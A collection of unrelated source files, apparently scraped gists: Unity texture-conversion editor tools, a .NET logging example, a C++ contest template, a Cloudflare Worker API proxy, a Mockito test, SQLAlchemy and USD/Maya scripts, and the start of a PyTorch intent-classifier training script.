			File.WriteAllBytes( path, new Texture2D( 2, 2 ).EncodeToPNG() );
			AssetDatabase.ImportAsset( path, ImportAssetOptions.ForceUpdate );
 }


 TextureImporter textureImporter = AssetImporter.GetAtPath( path ) as TextureImporter;
		textureImporter.maxTextureSize = maxSize;
		textureImporter.isReadable = true;
		textureImporter.filterMode = FilterMode.Point;
		textureImporter.mipmapEnabled = false;
		textureImporter.alphaSource = TextureImporterAlphaSource.FromInput;
		textureImporter.alphaIsTransparency = true;
		textureImporter.textureCompression = TextureImporterCompression.Uncompressed;
		textureImporter.SaveAndReimport();
 }


 // Checks if downsized Texture's pixels are all same
 private bool CheckTextureAtPath( string texturePath, string dummyTexturePath )
 {
		File.Copy( texturePath, dummyTexturePath, true );
		AssetDatabase.ImportAsset( dummyTexturePath, ImportAssetOptions.ForceUpdate );


 Texture2D texture = AssetDatabase.LoadAssetAtPath<Texture2D>( dummyTexturePath );
 if( !texture ) // RenderTextures, for example, are also Textures but not Texture2Ds
 return false;


		Color32[] colors = texture.GetPixels32();
 Color32 color = colors[0];
 for( int i = 1; i < colors.Length; i++ )
 {
 Color32 color2 = colors[i];
 if( color2.r != color.r || color2.g != color.g || color2.b != color.b || color2.a != color.a )
 return false;
 }


 return true;
 }


 // Hides the Texture at the specified index from the results
 private void HideTexture( int textureIndex )
 {
		results.RemoveAt( textureIndex );


		SaveSession( null );
		Repaint();
 }


 // Saves current session to file
 private void SaveSession( string json )
 {
 if( string.IsNullOrEmpty( json ) )
 json = JsonUtility.ToJson( new SaveData() { paths = results }, false );


		File.WriteAllText( SAVE_FILE_PATH, json );
 }


 // Restores previous session
 private void LoadSession( string json )
 {
 if( string.IsNullOrEmpty( json ) )
 {
 if( !File.Exists( SAVE_FILE_PATH ) )
 return;


 json = File.ReadAllText( SAVE_FILE_PATH );
 }


 SaveData saveData = JsonUtility.FromJson<SaveData>( json );


 // Remove non-existent paths
 for( int i = saveData.paths.Count - 1; i >= 0; i-- )
 {
 if( !File.Exists( saveData.paths[i] ) )
				saveData.paths.RemoveAt( i );
 }


 results = saveData.paths;
		Repaint();
 }
}
==<SEPERATOR>==
ConvertTexturesToPNG.cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using UnityEditor;
using UnityEngine;
using Debug = UnityEngine.Debug;
using Object = UnityEngine.Object;


public class ConvertTexturesToPNG : EditorWindow
{
 private const string DUMMY_TEXTURE_PATH = ""Assets/convert_dummyy_texturee.png"";
 private const bool REMOVE_MATTE_FROM_PSD_BY_DEFAULT = true;


 private readonly GUIContent[] maxTextureSizeStrings = { new GUIContent( ""32"" ), new GUIContent( ""64"" ), new GUIContent( ""128"" ), new GUIContent( ""256"" ), new GUIContent( ""512"" ), new GUIContent( ""1024"" ), new GUIContent( ""2048"" ), new GUIContent( ""4096"" ), new GUIContent( ""8192"" ), new GUIContent( ""16384"" ) };
 private readonly int[] maxTextureSizeValues = { 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384 };


 private readonly GUIContent rootPathContent = new GUIContent( ""Root Path:"", ""Textures inside this folder (recursive) will be converted"" );
 private readonly GUIContent textureExtensionsContent = new GUIContent( ""Textures to Convert:"", ""Only Textures with these extensions will be converted (';' separated)"" );
 private readonly GUIContent excludedDirectoriesContent = new GUIContent( ""Excluded Directories:"", ""Textures inside these directories won't be converted (';' separated)"" );
 private readonly GUIContent keepOriginalFilesContent = new GUIContent( ""Keep Original Files:"", ""If selected, original Texture files won't be deleted after the conversion"" );
 private readonly GUIContent maxTextureSizeContent = new GUIContent( ""Max Texture Size:"", ""Textures larger than this size will be downscaled to this size"" );
 private readonly GUIContent optiPNGPathContent = new GUIContent( ""OptiPNG Path (Optional):"", ""If 'optipng.exe' is selected, it will be used to reduce the image sizes even further (roughly 20%) but the process will take more time"" );
 private readonly GUIContent optiPNGOptimizationContent = new GUIContent( ""OptiPNG Optimization:"", ""Determines how many trials OptiPNG will do to optimize the image sizes. As this value increases, computation time will increase exponentially"" );
 private readonly GUIContent optiPNGURL = new GUIContent( ""..."", ""http://optipng.sourceforge.net/"" );
 private readonly GUILayoutOption GL_WIDTH_25 = GUILayout.Width( 25f );


 private string rootPath = """";
 private string textureExtensions = "".tga;.psd;.tiff;.tif;.bmp"";
 private string excludedDirectories = """";
 private bool keepOriginalFiles = false;
 private int maxTextureSize = 8192;
 private string optiPNGPath = """";
 private int optiPNGOptimization = 3;


 private Vector2 scrollPos;


 [MenuItem( ""Window/Convert Textures to PNG"" )]
 private static void Init()
 {
 ConvertTexturesToPNG window = GetWindow<ConvertTexturesToPNG>();
		window.titleContent = new GUIContent( ""Convert to PNG"" );
		window.minSize = new Vector2( 285f, 160f );
		window.Show();
 }


 private void OnEnable()
 {
 // By default, Root Path points to this project's Assets folder
 if( string.IsNullOrEmpty( rootPath ) )
 rootPath = Application.dataPath;
 }


 private void OnGUI()
 {
 scrollPos = GUILayout.BeginScrollView( scrollPos );


 rootPath = PathField( rootPathContent, rootPath, true, ""Choose target directory"" );
 textureExtensions = EditorGUILayout.TextField( textureExtensionsContent, textureExtensions );
 excludedDirectories = EditorGUILayout.TextField( excludedDirectoriesContent, excludedDirectories );
 keepOriginalFiles = EditorGUILayout.Toggle( keepOriginalFilesContent, keepOriginalFiles );
 maxTextureSize = EditorGUILayout.IntPopup( maxTextureSizeContent, maxTextureSize, maxTextureSizeStrings, maxTextureSizeValues );
 optiPNGPath = PathField( optiPNGPathContent, optiPNGPath, false, ""Choose optipng.exe path"", optiPNGURL );
 if( !string.IsNullOrEmpty( optiPNGPath ) )
 {
			EditorGUI.indentLevel++;
 optiPNGOptimization = EditorGUILayout.IntSlider( optiPNGOptimizationContent, optiPNGOptimization, 2, 7 );
			EditorGUI.indentLevel--;
 }


		EditorGUILayout.Space();


 // Convert Textures to PNG
 if( GUILayout.Button( ""Convert to PNG!"" ) )
 {
 double startTime = EditorApplication.timeSinceStartup;


 List<string> convertedPaths = new List<string>( 128 );
 long originalTotalSize = 0L, convertedTotalSize = 0L, convertedTotalSizeOptiPNG = 0L;


 try
 {
 rootPath = rootPath.Trim();
 excludedDirectories = excludedDirectories.Trim();
 textureExtensions = textureExtensions.ToLowerInvariant().Replace( "".png"", """" ).Trim();
 optiPNGPath = optiPNGPath.Trim();


 if( rootPath.Length == 0 )
 rootPath = Application.dataPath;


 if( optiPNGPath.Length > 0 && !File.Exists( optiPNGPath ) )
					Debug.LogWarning( ""OptiPNG doesn't exist at path: "" + optiPNGPath );


 string[] paths = FindTexturesToConvert();
 string pathsLengthStr = paths.Length.ToString();
 float progressMultiplier = paths.Length > 0 ? ( 1f / paths.Length ) : 1f;


				CreateDummyTexture(); // Dummy Texture is used while reading Textures' pixels


 for( int i = 0; i < paths.Length; i++ )
 {
 if( EditorUtility.DisplayCancelableProgressBar( ""Please wait..."", string.Concat( ""Converting: "", ( i + 1 ).ToString(), ""/"", pathsLengthStr ), ( i + 1 ) * progressMultiplier ) )
 throw new Exception( ""Conversion aborted"" );


 string pngFile = Path.ChangeExtension( paths[i], "".png"" );
 string pngMetaFile = pngFile + "".meta"";
 string originalMetaFile = paths[i] + "".meta"";


 bool isPSDImage = Path.GetExtension( paths[i] ).ToLowerInvariant() == "".psd"";


 // Make sure to respect PSD assets' ""Remove Matte (PSD)"" option
 if( isPSDImage )
 {
 bool removeMatte = REMOVE_MATTE_FROM_PSD_BY_DEFAULT;


 if( File.Exists( originalMetaFile ) )
 {
 const string removeMatteOption = ""pSDRemoveMatte: "";


 string metaContents = File.ReadAllText( originalMetaFile );
 int removeMatteIndex = metaContents.IndexOf( removeMatteOption );
 if( removeMatteIndex >= 0 )
 removeMatte = metaContents[removeMatteIndex + removeMatteOption.Length] != '0';
 }


 SerializedProperty removeMatteProp = new SerializedObject( AssetImporter.GetAtPath( DUMMY_TEXTURE_PATH ) ).FindProperty( ""m_PSDRemoveMatte"" );
 if( removeMatteProp != null && removeMatteProp.boolValue != removeMatte )
 {
							removeMatteProp.boolValue = removeMatte;
							removeMatteProp.serializedObject.ApplyModifiedPropertiesWithoutUndo();
 }
 }


 // Temporarily copy the image file to Assets folder to create a read-write enabled Texture from it
					File.Copy( paths[i], DUMMY_TEXTURE_PATH, true );
					AssetDatabase.ImportAsset( DUMMY_TEXTURE_PATH, ImportAssetOptions.ForceUpdate );


 // Convert the Texture to PNG and save it
 byte[] pngBytes = AssetDatabase.LoadAssetAtPath<Texture2D>( DUMMY_TEXTURE_PATH ).EncodeToPNG();
					File.WriteAllBytes( pngFile, pngBytes );


 originalTotalSize += new FileInfo( paths[i] ).Length;
 convertedTotalSize += new FileInfo( pngFile ).Length;


 // Run OptiPNG to optimize the PNG
 if( optiPNGPath.Length > 0 && File.Exists( optiPNGPath ) )
 {
 try
 {
							Process.Start( new ProcessStartInfo( optiPNGPath )
 {
 Arguments = string.Concat( ""-o "", optiPNGOptimization.ToString(), "" \"""", pngFile, ""\"""" ),
 CreateNoWindow = true,
 UseShellExecute = false
 } ).WaitForExit();
 }
 catch( Exception e )
 {
							Debug.LogException( e );
 }


 convertedTotalSizeOptiPNG += new FileInfo( pngFile ).Length;
 }


 // If .meta file exists, copy it to PNG image
 if( File.Exists( originalMetaFile ) )
 {
						File.Copy( originalMetaFile, pngMetaFile, true );


 // Try changing original meta file's GUID to avoid collisions with PNG (Credit: https://gist.github.com/ZimM-LostPolygon/7e2f8a3e5a1be183ac19)
 if( keepOriginalFiles )
 {
 string metaContents = File.ReadAllText( originalMetaFile );
 int guidIndex = metaContents.IndexOf( ""guid: "" );
 if( guidIndex >= 0 )
 {
 string guid = metaContents.Substring( guidIndex + 6, 32 );
 string newGuid = Guid.NewGuid().ToString( ""N"" );
 metaContents = metaContents.Replace( guid, newGuid );
								File.WriteAllText( originalMetaFile, metaContents );
 }
 }


 // Don't show ""Remote Matte (PSD)"" option for converted Textures
 if( isPSDImage )
 {
 string metaContents = File.ReadAllText( pngMetaFile );
 bool modifiedMeta = false;


 if( metaContents.Contains( ""pSDShowRemoveMatteOption: 1"" ) )
 {
 metaContents = metaContents.Replace( ""pSDShowRemoveMatteOption: 1"", ""pSDShowRemoveMatteOption: 0"" );
 modifiedMeta = true;
 }
 if( metaContents.Contains( ""pSDRemoveMatte: 1"" ) )
 {
 metaContents = metaContents.Replace( ""pSDRemoveMatte: 1"", ""pSDRemoveMatte: 0"" );
 modifiedMeta = true;
 }


 if( modifiedMeta )
								File.WriteAllText( pngMetaFile, metaContents );
 }
 }


 if( !keepOriginalFiles )
 {
						File.Delete( paths[i] );


 if( File.Exists( originalMetaFile ) )
							File.Delete( originalMetaFile );
 }


					convertedPaths.Add( paths[i] );
 }
 }
 catch( Exception e )
 {
				Debug.LogException( e );
 }
 finally
 {
				EditorUtility.ClearProgressBar();


 if( File.Exists( DUMMY_TEXTURE_PATH ) )
					AssetDatabase.DeleteAsset( DUMMY_TEXTURE_PATH );


 // Force Unity to import PNG images (otherwise we'd have to minimize Unity and then maximize it)
				AssetDatabase.Refresh();


 // Print information to Console
 StringBuilder sb = new StringBuilder( 100 + convertedPaths.Count * 75 );
				sb.Append( ""Converted "" ).Append( convertedPaths.Count ).Append( "" Texture(s) to PNG in "" ).Append( ( EditorApplication.timeSinceStartup - startTime ).ToString( ""F2"" ) ).Append( "" seconds ("" ).
 Append( EditorUtility.FormatBytes( originalTotalSize ) ).Append( "" -> "" ).Append( EditorUtility.FormatBytes( convertedTotalSize ) );


 if( convertedTotalSizeOptiPNG > 0L )
					sb.Append( "" -> "" ).Append( EditorUtility.FormatBytes( convertedTotalSizeOptiPNG ) ).Append( "" with OptiPNG"" );


				sb.AppendLine( ""):"" );
 for( int i = 0; i < convertedPaths.Count; i++ )
					sb.Append( ""- "" ).AppendLine( convertedPaths[i] );


				Debug.Log( sb.ToString() );
 }
 }


		GUILayout.EndScrollView();
 }


 private string PathField( GUIContent label, string path, bool isDirectory, string title, GUIContent downloadURL = null )
 {
		GUILayout.BeginHorizontal();
 path = EditorGUILayout.TextField( label, path );
 if( GUILayout.Button( ""o"", GL_WIDTH_25 ) )
 {
 string selectedPath = isDirectory ? EditorUtility.OpenFolderPanel( title, """", """" ) : EditorUtility.OpenFilePanel( title, """", ""exe"" );
 if( !string.IsNullOrEmpty( selectedPath ) )
 path = selectedPath;


			GUIUtility.keyboardControl = 0; // Remove focus from active text field
 }
 if( downloadURL != null && GUILayout.Button( downloadURL, GL_WIDTH_25 ) )
			Application.OpenURL( downloadURL.tooltip );
		GUILayout.EndHorizontal();


 return path;
 }


 private string[] FindTexturesToConvert()
 {
 HashSet<string> texturePaths = new HashSet<string>();
 HashSet<string> targetExtensions = new HashSet<string>( textureExtensions.Split( ';' ) );


 // Get directories to exclude
 string[] excludedPaths = excludedDirectories.Split( ';' );
 for( int i = 0; i < excludedPaths.Length; i++ )
 {
			excludedPaths[i] = excludedPaths[i].Trim();
 if( excludedPaths[i].Length == 0 )
				excludedPaths[i] = ""NULL/"";
 else
 {
				excludedPaths[i] = Path.GetFullPath( excludedPaths[i] );


 // Make sure excluded directory paths end with directory separator char
 if( Directory.Exists( excludedPaths[i] ) && !excludedPaths[i].EndsWith( Path.DirectorySeparatorChar.ToString() ) )
					excludedPaths[i] += Path.DirectorySeparatorChar;
 }
 }


 // Iterate through all files in Root Path
 string[] allFiles = Directory.GetFiles( rootPath, ""*.*"", SearchOption.AllDirectories );
 for( int i = 0; i < allFiles.Length; i++ )
 {
 // Only process filtered image files
 if( targetExtensions.Contains( Path.GetExtension( allFiles[i] ).ToLowerInvariant() ) )
 {
 bool isExcluded = false;
 if( excludedPaths.Length > 0 )
 {
 // Make sure the image file isn't part of an excluded directory
 string fileFullPath = Path.GetFullPath( allFiles[i] );
 for( int j = 0; j < excludedPaths.Length; j++ )
 {
 if( fileFullPath.StartsWith( excludedPaths[j] ) )
 {
 isExcluded = true;
 break;
 }
 }
 }


 if( !isExcluded )
					texturePaths.Add( allFiles[i] );
 }
 }


 string[] result = new string[texturePaths.Count];
		texturePaths.CopyTo( result );


 return result;
 }


 // Creates dummy Texture asset that will be used to read Textures' pixels
 private void CreateDummyTexture()
 {
 if( !File.Exists( DUMMY_TEXTURE_PATH ) )
 {
			File.WriteAllBytes( DUMMY_TEXTURE_PATH, new Texture2D( 2, 2 ).EncodeToPNG() );
			AssetDatabase.ImportAsset( DUMMY_TEXTURE_PATH, ImportAssetOptions.ForceUpdate );
 }


 TextureImporter textureImporter = AssetImporter.GetAtPath( DUMMY_TEXTURE_PATH ) as TextureImporter;
		textureImporter.maxTextureSize = maxTextureSize;
		textureImporter.isReadable = true;
		textureImporter.filterMode = FilterMode.Point;
		textureImporter.mipmapEnabled = false;
		textureImporter.alphaSource = TextureImporterAlphaSource.FromInput;
		textureImporter.npotScale = TextureImporterNPOTScale.None;
		textureImporter.textureCompression = TextureImporterCompression.Uncompressed;
		textureImporter.SaveAndReimport();
 }
}
"
"ConsoleDiLoggingTests.cs
","using Logging;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;


var builder = Host.CreateDefaultBuilder(args);


builder
 .ConfigureLogging(logging => logging
 .ClearProviders()
 .AddConsole());


builder
 .ConfigureServices(services => services
 .AddScoped<LogTest>()
 .AddSingleton<IWorkerService, WorkerService>());


var app = builder.Build();


var worker = ActivatorUtilities.CreateInstance<Worker>(app.Services);
worker.WorkerTest($""Hello from {nameof(worker)}!"");


var logTest = ActivatorUtilities.CreateInstance<LogTest>(app.Services);
logTest.LogMessage($""Hello from {nameof(logTest)}!"");


internal class Worker(IWorkerService workerService)
{
 public void WorkerTest(string message) => workerService.WorkerServiceTest(message);
}


internal interface IWorkerService
{
 void WorkerServiceTest(string message);
}


internal class WorkerService(LogTest logTest) : IWorkerService
{
 public void WorkerServiceTest(string message) => logTest.LoggerTest(message);
}


namespace Logging
{
 public partial class LogTest(ILogger<LogTest> logger)
 {
 // ReSharper disable once ReplaceWithPrimaryConstructorParameter
 private readonly ILogger<LogTest> logger = logger;


 public void LoggerTest(string message) => LogMessage(message);


 [LoggerMessage(Level = LogLevel.Information, Message = ""Test log: {message}"")]
 public partial void LogMessage(string message);
 }
}
"
"CPP_Template.cpp
","#include <bits/stdc++.h>
using namespace std;


/* clang-format off */


/* TYPES  */
#define ll long long
#define pii pair<int, int>
#define pll pair<long long, long long>
#define vi vector<int>
#define vll vector<long long>
#define mii map<int, int>
#define si set<int>
#define sc set<char>


/* FUNCTIONS */
#define f(i,s,e) for(long long int i=s;i<e;i++)
#define cf(i,s,e) for(long long int i=s;i<=e;i++)
#define rf(i,e,s) for(long long int i=e-1;i>=s;i--)
#define pb push_back
#define eb emplace_back


/* PRINTS */
template <class T>
void print_v(vector<T> &v) { cout << ""{""; for (auto x : v) cout << x << "",""; cout << ""\b}""; }


/* UTILS */
#define MOD 1000000007
#define PI 3.1415926535897932384626433832795
#define read(type) readInt<type>()
ll min(ll a,int b) { if (a<b) return a; return b; }
ll min(int a,ll b) { if (a<b) return a; return b; }
ll max(ll a,int b) { if (a>b) return a; return b; }
ll max(int a,ll b) { if (a>b) return a; return b; }
ll gcd(ll a,ll b) { if (b==0) return a; return gcd(b, a%b); }
ll lcm(ll a,ll b) { return a/gcd(a,b)*b; }
string to_upper(string a) { for (int i=0;i<(int)a.size();++i) if (a[i]>='a' && a[i]<='z') a[i]-='a'-'A'; return a; }
string to_lower(string a) { for (int i=0;i<(int)a.size();++i) if (a[i]>='A' && a[i]<='Z') a[i]+='a'-'A'; return a; }
bool prime(ll a) { if (a==1) return 0; for (int i=2;i<=round(sqrt(a));++i) if (a%i==0) return 0; return 1; }
void yes() { cout<<""YES\n""; }
void no() { cout<<""NO\n""; }


/*  All Required define Pre-Processors and typedef Constants */
typedef long int int32;
typedef unsigned long int uint32;
typedef long long int int64;
typedef unsigned long long int  uint64;




/* clang-format on */


/* Main()  function */
int main()
{


	#ifndef ONLINE_JUDGE
 freopen(""input.txt"",""r"",stdin);
 //freopen(""output.txt"",""w"",stdout);
	#endif


 int tc;
	tc = read(int);


 while(tc--){
 write(tc);
	}
 return 0;
}
/* Main() Ends Here */
==<SEPERATOR>==
cf-worker.js
// We support the GET, POST, HEAD, and OPTIONS methods from any origin,
// and allow any header on requests. These headers must be present
// on all responses to all CORS preflight requests. In practice, this means
// all responses to OPTIONS requests.
const corsHeaders = {
 ""Access-Control-Allow-Origin"": ""*"",
 ""Access-Control-Allow-Methods"": ""GET,HEAD,POST,OPTIONS"",
 ""Access-Control-Max-Age"": ""86400"",
}


// The URL for the remote third party API you want to fetch from
// but does not implement CORS
const API_URL = ""https://SERVICE_NAME.datahub.figment.io""
const WS_API_URL = ""wss://WEBSOCKET_SERVICE_NAME.datahub.figment.io""
const API_AUTH_KEY = ""YOUR_API_KEY_HERE""


// List all of the domains here that you want to be able to access this proxy
const ALLOWED_DOMAINS = [
 'my.example.com'
]


/**
 * Receives a HTTP request, proxies the request, and returns the response. If the request is a websocket requests,
 * it hands the request off to a separate handler for creating a websocket proxy.
 * @param {Request} request
 * @returns {Promise<Response>}
 */
async function handleRequest(request) {
 const { url, headers } = request
 const { host, pathname } = new URL(url)
 const dhURL = API_URL + pathname
 const request_origin = headers.get(""Origin"")


 const origin = request_origin ? new URL(request_origin) : { host: headers.get('Host') }


 if (ALLOWED_DOMAINS.includes(origin.host)){
 let response


 // Websocket requests are identified with an ""Upgrade:websocket"" HTTP header
 const upgradeHeader = request.headers.get(""Upgrade"")
 if (upgradeHeader && upgradeHeader === ""websocket"") {
 const dataHubWebsocketURL = WS_API_URL + pathname
 response = await handleWebsocketRequest(dataHubWebsocketURL)
 } else {
 dataHubRequest = new Request(dhURL, request)
 dataHubRequest.headers.set(""Authorization"", API_AUTH_KEY);
 dataHubRequest.headers.set(""Origin"", new URL(dhURL).origin)
 response = await fetch(dataHubRequest)
 
 // Recreate the response so we can modify the headers
 response = new Response(response.body, response)
 }


 // Set CORS headers
 response.headers.set(""Access-Control-Allow-Origin"", headers.get(""Origin""))


 // Append to/Add Vary header so browser will cache response correctly
 response.headers.append(""Vary"", ""Origin"")


 return response
 }
 else {
 return new Response(""Not Found for "" + host, { status: 404 })
 }
}


/**
 * Receives a HTTP request and replies with a websocket proxy
 * @param {Request} request
 * @returns {Promise<Response>}
 */
 async function handleWebsocketRequest(dataHubWebsocketURL) {
 // Establish the websocket connection to DataHub
 const dataHubResponse = await fetch(dataHubWebsocketURL, { headers: { ""Upgrade"": ""websocket"", ""Authorization"": API_AUTH_KEY } })
 if (dataHubResponse.status !== 101) {
 return new Response(null, {
 status: dataHubResponse.status,
 statusText: dataHubResponse.statusText
 })
 }
 const dataHubSocket = dataHubResponse.webSocket
 dataHubSocket.accept()


 // Create a client/server to act as the proxy layer
 const proxyWebSocketPair = new WebSocketPair()
 const [client, server] = Object.values(proxyWebSocketPair)


 // tell the Workers runtime that it should listen for WebSocket data and keep the connection open with client
 server.accept()


 // Any messages from the client are forwarded to the DataHub socket
 server.addEventListener(""message"", event => {
 dataHubSocket.send(event.data)
 })


 // Any messages coming from DataHub are forwarded back to the client
 dataHubSocket.addEventListener(""message"", event => {
 server.send(event.data)
 })


 const response = new Response(null, {
 status: 101,
 webSocket: client
 })
 
 return response
}


/**
 * Responds with an uncaught error.
 * @param {Error} error
 * @returns {Response}
 */
function handleError(error) {
 console.error('Uncaught error:', error)


 const { stack } = error
 return new Response(stack || error, {
 status: 500,
 headers: {
 'Content-Type': 'text/plain;charset=UTF-8'
 }
 })
}


function handleOptions(request) {
 // Make sure the necessary headers are present
 // for this to be a valid pre-flight request
 let headers = request.headers;
 if (
 headers.get(""Origin"") !== null &&
 headers.get(""Access-Control-Request-Method"") !== null &&
 headers.get(""Access-Control-Request-Headers"") !== null
 ){
 // Handle CORS pre-flight request.
 // If you want to check or reject the requested method + headers
 // you can do that here.
 let respHeaders = {
      ...corsHeaders,
 // Allow all future content Request headers to go back to browser
 // such as Authorization (Bearer) or X-Client-Name-Version
 ""Access-Control-Allow-Headers"": request.headers.get(""Access-Control-Request-Headers""),
 }


 return new Response(null, {
 headers: respHeaders,
 })
 }
 else {
 // Handle standard OPTIONS request.
 // If you want to allow other HTTP Methods, you can do that here.
 return new Response(null, {
 headers: {
 Allow: ""GET, HEAD, POST, OPTIONS"",
 },
 })
 }
}


addEventListener(""fetch"", event => {
 const request = event.request


 if (request.method === ""OPTIONS"") {
 // Handle CORS preflight requests
 event.respondWith(handleOptions(request))
 }
 else if(
 request.method === ""GET"" ||
 request.method === ""HEAD"" ||
 request.method === ""POST""
 ){
 // Handle requests to the API server
 event.respondWith(handleRequest(request))
 }
 else {
 event.respondWith(
 new Response(null, {
 status: 405,
 statusText: ""Method Not Allowed"",
 }),
 )
 }
})
"
"MockitoMultithreadedTest.java
","import org.junit.Test;
import org.mockito.ArgumentCaptor;
import org.mockito.Mockito;


import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


import static org.junit.Assert.assertEquals;
import static org.mockito.Mockito.after;
import static org.mockito.Mockito.verify;


public class MockitoMultithreadedTest {
 @Test
 public void shouldCapture10Arguments() throws Exception {
 final MockObj mockObj = Mockito.mock(MockObj.class);
 ExecutorService exec = Executors.newFixedThreadPool(1);
 exec.submit(() -> {
 for (int j = 0; j < 10; j++) {
 mockObj.method(0);
            }
        });
 ArgumentCaptor<Integer> argumentCaptor = ArgumentCaptor.forClass(Integer.class);
 verify(mockObj, after(1000).atLeastOnce()).method(argumentCaptor.capture());
 List<Integer> captured = argumentCaptor.getAllValues();
 assertEquals(10, captured.size());
    }


 private static class MockObj {
 void method(Integer arg) {
 // void
        }
    }
}
==<SEPERATOR>==
sqlalchemy_dynamic_table_creation.py
from __future__ import (absolute_import, division, print_function,
 unicode_literals)


from sqlalchemy import Column, MetaData, Table, create_engine
from sqlalchemy import String, Integer, Float, BigInteger, DateTime


from sqlalchemy.schema import DropTable, CreateTable
from sqlalchemy.orm import scoped_session, sessionmaker




from contextlib import contextmanager




@contextmanager
def Session(*args, **kwargs):
 Session = scoped_session(sessionmaker(
 bind=create_engine(*args, **kwargs)))


 try:
 session = Session()
 yield session
 session.commit()
 except:
 session.rollback()
 raise
 finally:
 session.close()




def main():
 DB = 'postgresql:///example'


 TABLE_SPEC = [
        ('id', BigInteger),
        ('name', String),
        ('t_modified', DateTime),
        ('whatever', String)
    ]


 TABLE_NAME = 'sample_table'


 columns = [Column(n, t) for n, t in TABLE_SPEC]
 table = Table(TABLE_NAME, MetaData(), *columns)


 with Session(DB, echo=True) as s:
 # this is just here to make the script idempotent
 s.execute('drop table if exists {}'.format(TABLE_NAME))


 table_creation_sql = CreateTable(table)
 s.execute(table_creation_sql)




if __name__ == '__main__':
 main()
==<SEPERATOR>==
usd_sdf_move_prim_spec.py
from pxr import Sdf, Usd


LIST_ATTRS = ['addedItems', 'appendedItems', 'deletedItems', 'explicitItems',
 'orderedItems', 'prependedItems']




def repath_properties(layer, old_path, new_path):
 """"""Re-path property relationship targets and attribute connections.

    This will replace any relationship or connections from old path
    to new path by replacing start of any path that matches the new path.

    Args:
        layer (Sdf.Layer): Layer to move prim spec path.
        old_path (Union[Sdf.Path, str]): Source path to move from.
        new_path (Union[Sdf.Path, str]): Destination path to move to.

    Returns:
        bool: Whether any re-pathing occurred for the given paths.

    """"""


 old_path_str = str(old_path)
 peformed_repath = False


 def replace_in_list(spec_list):
 """"""Replace paths in SdfTargetProxy or SdfConnectionsProxy""""""
 for attr in LIST_ATTRS:
 entries = getattr(spec_list, attr)
 for i, entry in enumerate(entries):
 entry_str = str(entry)
 if entry == old_path or entry_str.startswith(
 old_path_str + ""/""):
 # Repath
 entries[i] = Sdf.Path(
 str(new_path) + entry_str[len(old_path_str):])
 peformed_repath = True


 def repath(path):
 spec = layer.GetObjectAtPath(path)
 if isinstance(spec, Sdf.RelationshipSpec):
 replace_in_list(spec.targetPathList)
 if isinstance(spec, Sdf.AttributeSpec):
 replace_in_list(spec.connectionPathList)


 # Repath any relationship pointing to this src prim path
 layer.Traverse(""/"", repath)


 return peformed_repath




def move_prim_spec(layer, src_prim_path, dest_prim_path):
 """"""Move a PrimSpec and repath connections.

    Note that the parent path of the destination must
    exist, otherwise the namespace edit to that path
    will fail.

    Args:
        layer (Sdf.Layer): Layer to move prim spec path.
        src_prim_path (Union[Sdf.Path, str]): Source path to move from.
        dest_prim_path (Union[Sdf.Path, str]): Destination path to move to.

    Returns:
        bool: Whether the move was successful

    """"""


 src_prim_path = Sdf.Path(src_prim_path)
 dest_prim_path = Sdf.Path(dest_prim_path)
 dest_parent = dest_prim_path.GetParentPath()
 dest_name = dest_prim_path.name
 layer.GetPrimAtPath(dest_prim_path)


 with Sdf.ChangeBlock():
 reparent_edit = Sdf.NamespaceEdit.ReparentAndRename(
 src_prim_path,
 dest_parent,
 dest_name,
 -1
        )


 edit = Sdf.BatchNamespaceEdit()
 edit.Add(reparent_edit)
 if not layer.Apply(edit) and layer.GetPrimAtPath(src_prim_path):
 print(""Failed prim spec move"")
 return False


 repath_properties(layer, src_prim_path, dest_prim_path)


 return True




# Example usage in Maya to move /mtl to /asset/mtl for all
# maya usd proxy shapes in the scene in their current edit target layer
from maya import cmds
import mayaUsd


proxies = cmds.ls(type=""mayaUsdProxyShape"", long=True)
for proxy in proxies:
 stage = mayaUsd.ufe.getStage(""|world"" + proxy)
 layers = stage.GetLayerStack()
 targets = cmds.mayaUsdEditTarget(proxy, query=True, editTarget=True)
 target = targets[0]  # edit target layer identifier


 layer = next(
 layer for layer in stage.GetLayerStack() if layer.identifier == target)


 # Reparent and repath connections and relationships
 move_prim_spec(layer, ""/mtl"", ""/asset/mtl"")


 # Force viewport reset because sometimes viewport doesn't recognize
 # the shader moved
 cmds.ogs(reset=True)
==<SEPERATOR>==
TaskExecution.py
import nltk 
from nltk.stem.porter import PorterStemmer
from torch.utils.data import Dataset,DataLoader
import torch.nn as nn
import json
import torch
import numpy as np 
import random


def TrainTasks():


 class NeuralNet(nn.Module):


 def __init__(self,input_size,hidden_size,num_classes):
 super(NeuralNet,self).__init__()
 self.l1 = nn.Linear(input_size,hidden_size)
 self.l2 = nn.Linear(hidden_size,hidden_size)
 self.l3 = nn.Linear(hidden_size,num_classes)
 self.relu = nn.ReLU()


 def forward(self,x):
 out = self.l1(x)
 out = self.relu(out)
 out = self.l2(out)
 out = self.relu(out)
 out = self.l3(out)
 return out


 Stemmer = PorterStemmer()


 def tokenize(sentence):
 return nltk.word_tokenize(sentence)


 def stem(word):
 return Stemmer.stem(word.lower())


 def bag_of_words(tokenized_sentence,words):
 sentence_word = [stem(word) for word in tokenized_sentence]
 bag = np.zeros(len(words),dtype=np.float32)


 for idx , w in enumerate(words):
 if w in sentence_word:
 bag[idx] = 1


 return bag


 with open(""Data\\Tasks.json"",'r') as f:
 intents = json.load(f)


 all_words = []
 tags = []
 xy = []


 for intent in intents['intents']:
 tag = intent['tag']
 tags.append(tag)


 for pattern in intent['patterns']:
 w = tokenize(pattern)
 all_words.extend(w)
 xy.append((w,tag))


 ignore_words = [',','?','/','.','!']
 all_words = [stem(w) for w in all_words if w not in ignore_words]
 all_words = sorted(set(all_words))
 tags = sorted(set(tags))


 x_train = []
 y_train = []


 for (pattern_sentence,tag) in xy:
 bag = bag_of_words(pattern_sentence,all_words)
 x_train.append(bag)


 label = tags.index(tag)
 y_train.append(label)


 x_train = np.array(x_train)
 y_train = np.array(y_train)


 num_epochs = 1000
 batch_size = 8
 learning_rate = 0.001
 input_size = len(x_train[0])
 hidden_size = 8
 output_size = len(tags)


 print("">> Training The TasksExecution :- Working "")


 class ChatDataset(Dataset):


 def __init__(self):
 self.n_samples = len(x_train)
 self.x_data = x_train
 self.y_data = y_train


